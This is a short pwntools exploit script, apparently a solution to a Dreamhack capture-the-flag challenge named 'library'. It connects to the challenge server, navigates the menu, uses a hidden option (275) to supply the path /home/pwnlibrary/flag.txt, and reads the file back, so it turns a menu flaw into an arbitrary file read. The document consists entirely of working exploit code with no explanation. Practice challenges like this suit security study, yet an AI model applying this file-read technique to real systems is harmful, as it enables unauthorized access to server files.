from pwn import *

exe = ELF('./library', checksec=False)
# p = process(exe.path)
p = remote("host1.dreamhack.games", 11156)

# input()

p.sendlineafter(b'menu : ', b'1')
p.sendlineafter(b'borrow? : ', b'1')
p.sendlineafter(b'menu : ', b'3')
p.sendlineafter(b'menu : ', b'275')
p.sendlineafter(b'book? : ', b'/home/pwnlibrary/flag.txt')
p.sendlineafter(b'(MAX 400) : ', b'256')
p.sendlineafter(b'menu : ', b'2')
p.sendlineafter(b'read? : ', b'0')

p.interactive()